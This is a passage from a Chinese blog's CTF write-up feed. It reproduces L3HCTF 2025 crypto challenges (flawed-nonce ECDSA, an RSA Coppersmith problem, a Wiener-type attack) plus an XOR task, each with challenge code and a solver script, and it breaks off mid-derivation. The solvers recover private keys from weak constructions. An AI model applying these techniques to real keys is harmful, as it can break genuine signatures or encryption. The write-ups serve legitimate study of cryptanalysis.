title="XOR"></a>XOR</h1><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><br>key = <span class="hljs-string">b&#x27;...&#x27;</span><br>flag = <span class="hljs-string">b&#x27;...&#x27;</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key)==<span class="hljs-number">4</span><br><br>enc = bytes_to_long(xor(flag,key))<br><br>f1 = <span class="hljs-number">4585958212176920650644941909171976689111990</span><br>f2 = <span class="hljs-number">3062959364761961602614252587049328627114908</span><br>e1 = enc^f1<br>e2 = e1^f2<br><span class="hljs-built_in">print</span>(e2)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">10706859949950921239354880312196039515724907</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>f1 = <span class="hljs-number">4585958212176920650644941909171976689111990</span><br>f2 = <span class="hljs-number">3062959364761961602614252587049328627114908</span><br><br>e2=<span class="hljs-number">10706859949950921239354880312196039515724907</span><br>e1 = e2^f2<br>enc = e1^f1<br><span class="hljs-comment">#已知部分明文</span><br>hint = <span class="hljs-string">b&#x27;SYC&#123;&#x27;</span><br>key = xor(hint,long_to_bytes(enc)[:<span class="hljs-number">4</span>])<br>flag = xor(long_to_bytes(enc),key)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>极客大挑战</tag>
      
      <tag>Geek</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>L3HCTF 2025 WriteUp</title>
    <link href="/2025/07/20/L3HCTF%202025%20WriteUp/"/>
    <url>/2025/07/20/L3HCTF%202025%20WriteUp/</url>
    
    <content type="html"><![CDATA[<p>本文是对L3HCTF 2025的复现，包括Crypto和MISC两部分，记录了大概的做题过程，如有问题欢迎随时提出交流(<em>^_^</em>)</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="EzECDSA"><a href="#EzECDSA" class="headerlink" title="EzECDSA"></a>EzECDSA</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> NIST256p, SigningKey<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FlawedNonceGenerator</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        <span class="hljs-variable language_">self</span>.n = n<br>        <span class="hljs-variable language_">self</span>.a = random.randrange(<span class="hljs-number">1</span>, n)<br>        <span class="hljs-variable language_">self</span>.b = random.randrange(<span class="hljs-number">1</span>, n)<br>        <span class="hljs-variable language_">self</span>.c = random.randrange(<span class="hljs-number">1</span>, n)<br>        <span class="hljs-variable language_">self</span>.last_k = random.randrange(<span class="hljs-number">1</span>, n)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_nonce</span>(<span class="hljs-params">self</span>):<br>        current_k = <span class="hljs-variable language_">self</span>.last_k<br>        next_k = (<span class="hljs-variable language_">self</span>.a * current_k**<span class="hljs-number">2</span> + <span class="hljs-variable language_">self</span>.b * current_k + <span class="hljs-variable language_">self</span>.c) % <span class="hljs-variable language_">self</span>.n<br>        <span class="hljs-variable language_">self</span>.last_k = next_k<br>        <br>        <span class="hljs-keyword">return</span> current_k<br><br><br>curve = NIST256p<br>n = curve.order<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Curve order n: <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br>private_key = SigningKey.from_secret_exponent(random.randrange(<span class="hljs-number">1</span>, n), curve=curve)<br>d = private_key.privkey.secret_multiplier<br>public_key = private_key.get_verifying_key()<br><br>messages = [<br>    <span class="hljs-string">b&quot;Hello player, welcome to L3HCTF 2025!&quot;</span>,<br>    <span class="hljs-string">b&quot;This is a crypto challenge, as you can probably tell.&quot;</span>,<br>    <span class="hljs-string">b&quot;It&#x27;s about ECDSA, a very... robust algorithm.&quot;</span>,<br>    <span class="hljs-string">b&quot;I&#x27;m sure there are no implementation flaws whatsoever.&quot;</span>,<br>    <span class="hljs-string">b&quot;Anyway, here are your signatures. Good luck!&quot;</span>,<br>    <span class="hljs-string">f&quot;Oh, and the flag is L3HCTF&#123;&#123;<span class="hljs-subst">&#123;d&#125;</span>&#125;&#125;. Don&#x27;t tell anyone!&quot;</span>.encode(),<br>]<br>nonce_generator = FlawedNonceGenerator(n)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;signatures.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    k = nonce_generator.generate_nonce()<br>    message = messages[i]<br>    h = <span class="hljs-built_in">int</span>.from_bytes(hashlib.sha256(message).digest(), <span class="hljs-string">&#x27;big&#x27;</span>)<br>    R = k * curve.generator<br>    r = R.x() % n<br>    s_inv = <span class="hljs-built_in">pow</span>(k, -<span class="hljs-number">1</span>, n)<br>    s = (s_inv * (h + d * r)) % n<br>    f.write(<span class="hljs-string">f&quot;h: <span class="hljs-subst">&#123;h&#125;</span>, r: <span class="hljs-subst">&#123;r&#125;</span>, s: <span class="hljs-subst">&#123;s&#125;</span>\n&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><strong>分析：</strong> 利用所知道的关系列方程组，一共可以列出12个方程，总共有11个未知数，因此很有可能可以直接求出d，所以在sage中消元并解方程即可。</p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> NIST256p<br><span class="hljs-keyword">import</span> re<br>n = NIST256p.order<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;signatures.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br>hs, rs, ss = [], [], []<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    h = <span class="hljs-built_in">int</span>(re.search(<span class="hljs-string">r&quot;h: (\d+)&quot;</span>, line).group(<span class="hljs-number">1</span>))<br>    r = <span class="hljs-built_in">int</span>(re.search(<span class="hljs-string">r&quot;r: (\d+)&quot;</span>, line).group(<span class="hljs-number">1</span>))<br>    s = <span class="hljs-built_in">int</span>(re.search(<span class="hljs-string">r&quot;s: (\d+)&quot;</span>, line).group(<span class="hljs-number">1</span>))<br>    hs.append(h)<br>    rs.append(r)<br>    ss.append(s)<br><br>R.&lt;k1, k2, k3, k4, k5, k6, a, b, c, d&gt; = PolynomialRing(Zmod(n))<br><br>eqs = [<br>    k2 - (a*k1^<span class="hljs-number">2</span> + b*k1 + c),<br>    k3 - (a*k2^<span class="hljs-number">2</span> + b*k2 + c),<br>    k4 - (a*k3^<span class="hljs-number">2</span> + b*k3 + c),<br>    k5 - (a*k4^<span class="hljs-number">2</span> + b*k4 + c),<br>    k6 - (a*k5^<span class="hljs-number">2</span> + b*k5 + c),<br>    ss[<span class="hljs-number">0</span>]*k1 - (hs[<span class="hljs-number">0</span>] + rs[<span class="hljs-number">0</span>]*d),<br>    ss[<span class="hljs-number">1</span>]*k2 - (hs[<span class="hljs-number">1</span>] + rs[<span class="hljs-number">1</span>]*d),<br>    ss[<span class="hljs-number">2</span>]*k3 - (hs[<span class="hljs-number">2</span>] + rs[<span class="hljs-number">2</span>]*d),<br>    ss[<span class="hljs-number">3</span>]*k4 - (hs[<span class="hljs-number">3</span>] + rs[<span class="hljs-number">3</span>]*d),<br>    ss[<span class="hljs-number">4</span>]*k5 - (hs[<span class="hljs-number">4</span>] + rs[<span class="hljs-number">4</span>]*d),<br>    ss[<span class="hljs-number">5</span>]*k6 - (hs[<span class="hljs-number">5</span>] + rs[<span class="hljs-number">5</span>]*d)<br>]<br><br>I = ideal(eqs)<br>G = I.groebner_basis()<br><span class="hljs-comment">#print(G)</span><br><span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> G:<br>    <span class="hljs-keyword">if</span> g.variables() == (d,):<br>        poly = g<br>        <span class="hljs-keyword">break</span><br><br>sols = poly.univariate_polynomial().roots(multiplicities=<span class="hljs-literal">False</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;L3HCTF&#123;&#123;<span class="hljs-subst">&#123;sols&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="math-problem"><a href="#math-problem" class="headerlink" title="math-problem"></a>math-problem</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">from</span> scret <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myfunction</span>(<span class="hljs-params">num</span>):<br>    output = <span class="hljs-number">0</span><br>    output=num**<span class="hljs-number">3</span><br>    <span class="hljs-keyword">return</span> output<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    flag_len = <span class="hljs-built_in">len</span>(flag)<br>    p, q = getPrime(<span class="hljs-number">512</span>), getPrime(<span class="hljs-number">512</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = getPrime(<span class="hljs-number">512</span>)<br>        R = bytes_to_long(<span class="hljs-built_in">str</span>(r).encode())<br>        <span class="hljs-keyword">if</span> isPrime(R):<br>            <span class="hljs-keyword">break</span><br><br>    n = p * q * r<br>    hint1 = R * r<br>    mod = myfunction(n)<br>    hint2 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>*n+<span class="hljs-number">1</span>, p % (<span class="hljs-number">2</span> ** <span class="hljs-number">400</span>), mod)<br>    m = bytes_to_long(flag)<br>    c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">65537</span>, n)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;All data:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;hint1 = <span class="hljs-subst">&#123;hint1&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;hint2 = <span class="hljs-subst">&#123;hint2&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">All data:</span><br><span class="hljs-string">n = 1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921</span><br><span class="hljs-string">c = 102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984</span><br><span class="hljs-string">hint1 = 41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333</span><br><span class="hljs-string">hint2 = 10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br><strong>（1）Part1：</strong><br>$\because n &#x3D; p\cdot q\cdot r,hint1&#x3D;R\cdot r$<br>$\therefore gcd(n,hint1) &#x3D; kr，这里的k&#x3D;1或p或q或pq$<br>$\because 可以查看gcd(n,hint1).nbits()&#x3D;512，则k&#x3D;1$<br>$\therefore r&#x3D;gcd(n,hint1)$<br><strong>（2）Part2：</strong><br>$\because hint2 &#x3D; (3n+1)^{p \mod 2^{400}}\mod n^3，设p_{low}&#x3D; p\mod 2^{400}$<br>$\therefore$ 由二项式定理得，</p><span>$$hint2 = (_2^{p_{low}})9n^2+(^{p_{low}}_1)3n+1 \mod n^3$$</span><p>$\therefore hint2 &#x3D; \frac{p_{low}\cdot (p_{low}-1)}{2}\cdot 9n^2 + p_{low}\cdot 3n+1\mod n^3$<br>$\therefore hint2 \equiv p_{low}\cdot 3n+1 \mod n^2$<br>$\therefore (hint2-1)&#x2F;&#x2F;n \equiv p_{low}\cdot 3$<br>$\therefore p_{low} \equiv (hint2-1)\cdot 3^{-1}\mod n$<br>之后利用coppersmith定理<br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,inverse<br><br>n = <span class="hljs-number">1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921</span><br>c = <span class="hljs-number">102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984</span><br>hint1 = <span class="hljs-number">41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333</span><br>hint2 = <span class="hljs-number">10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907</span><br><br>r = gmpy2.gcd(hint1, n)<br>t = n // r<br><br><span class="hljs-comment">#恢复 p 的低 400 位 k</span><br>inv3 = inverse(<span class="hljs-number">3</span>,n)<br>p_low = ((hint2-<span class="hljs-number">1</span>)//n*inv3) %n<br><br><span class="hljs-comment">#使用 Coppersmith 方法恢复完整的 p</span><br>M = <span class="hljs-number">2</span>**<span class="hljs-number">400</span><br>P.&lt;x&gt; = PolynomialRing(Zmod(t))<br>f = x*<span class="hljs-number">2</span>^<span class="hljs-number">400</span> + p_low<br>f = f.monic()<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">112</span>,beta=<span class="hljs-number">0.44</span>)<br><br>p = <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])*<span class="hljs-number">2</span>^<span class="hljs-number">400</span> + p_low<br>q = t // p<br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)<br>d = inverse(<span class="hljs-number">65537</span>, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RRRSSSAAA"><a href="#RRRSSSAAA" class="headerlink" title="RRRSSSAAA"></a>RRRSSSAAA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_vulnerable_key</span>(<span class="hljs-params">bits=<span class="hljs-number">1024</span></span>):<br>    p_bits = bits // <span class="hljs-number">2</span><br>    q_bits = bits - p_bits<br>    <span class="hljs-comment">#p，q接近</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = random_prime(<span class="hljs-number">2</span>**(p_bits), lbound=<span class="hljs-number">2</span>**(p_bits-<span class="hljs-number">1</span>))<br>        q = random_prime(<span class="hljs-number">2</span>**(q_bits), lbound=<span class="hljs-number">2</span>**(q_bits-<span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> p != q <span class="hljs-keyword">and</span> p &gt; q <span class="hljs-keyword">and</span> p &lt; <span class="hljs-number">2</span>*q:<span class="hljs-comment">#q&lt;p&lt;2*q</span><br>            <span class="hljs-keyword">break</span><br>            <br>    N = p * q<br>    phi = (p**<span class="hljs-number">4</span> - <span class="hljs-number">1</span>) * (q**<span class="hljs-number">4</span> - <span class="hljs-number">1</span>)<br><br>    d_bits = <span class="hljs-number">1024</span><br>    d_bound = <span class="hljs-number">2</span>**d_bits<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        d_small = randint(<span class="hljs-number">2</span>, d_bound)<br>        d = phi - d_small<br>        <span class="hljs-keyword">if</span> gcd(d, phi) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> d_small.bit_length() == <span class="hljs-number">1021</span>:<br>                <span class="hljs-keyword">break</span><br><br>    e = inverse_mod(d, phi)<br>    <br>    <span class="hljs-keyword">return</span> N, e<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">m, N, e</span>):<br>    n = <span class="hljs-number">4</span><br>    r = <span class="hljs-number">2</span><br>    R = Integers(N)<br>    P = PolynomialRing(R, <span class="hljs-string">&#x27;t&#x27;</span>)<br>    t = P.gen()<br>    Q = P.quotient(t**n - r)<br><br>    m_poly = Q([m, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>])<br><br>    c_poly = m_poly ** e<br><br>    <span class="hljs-keyword">return</span> c_poly.lift()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    N, e = generate_vulnerable_key()<br>    m = <span class="hljs-built_in">int</span>.from_bytes(flag, <span class="hljs-string">&#x27;big&#x27;</span>)<br>    c = encrypt(m, N, e)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;N = <span class="hljs-subst">&#123;N&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># N = 99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609</span><br><span class="hljs-comment"># e = 74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827</span><br><span class="hljs-comment"># c = 98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br><strong>维纳攻击</strong><br>这里回顾一下RSA维纳攻击的原理：<br><strong>（1）攻击条件：</strong><br>$d&lt;\frac{1}{3}N^{\frac{1}{4}}$</p><blockquote><p>为什么有这个条件呢，这里不得不提到<strong>勒让德定理</strong>（Legendre‘s theorem）：<br>若$|\alpha - \frac{p}{q}|&lt; \frac{1}{2q^2}，则有\frac{p}{q}一定是\alpha的收敛子$</p></blockquote><p>$\because ed &#x3D; k\phi(N)+1$<br>$\therefore 两边同时除以d\phi(N)，有\frac{c}{\phi(N)}-\frac{k}{d}&#x3D;\frac{1}{d\phi(N)}$根据条件可以大概推出是满足勒让德定理的，但是我们不知道$\phi(N)$，因此要想办法用$N$代替。同时可以得到$\frac{k}{d}\approx \frac{e}{\phi(N)}，则有k&lt;d$<br>$\because N\approx \phi(N)$<br>$\therefore 记s&#x3D;p+q-1计算|\frac{e}{N}-\frac{k}{d}|&#x3D;|\frac{ed-kN}{dN}|&#x3D;|\frac{k\phi(N)+1-kN}{d}N|&#x3D;|\frac{1-ks}{dN}|$<br>$\because s&#x3D;p+q-1&lt;3\sqrt 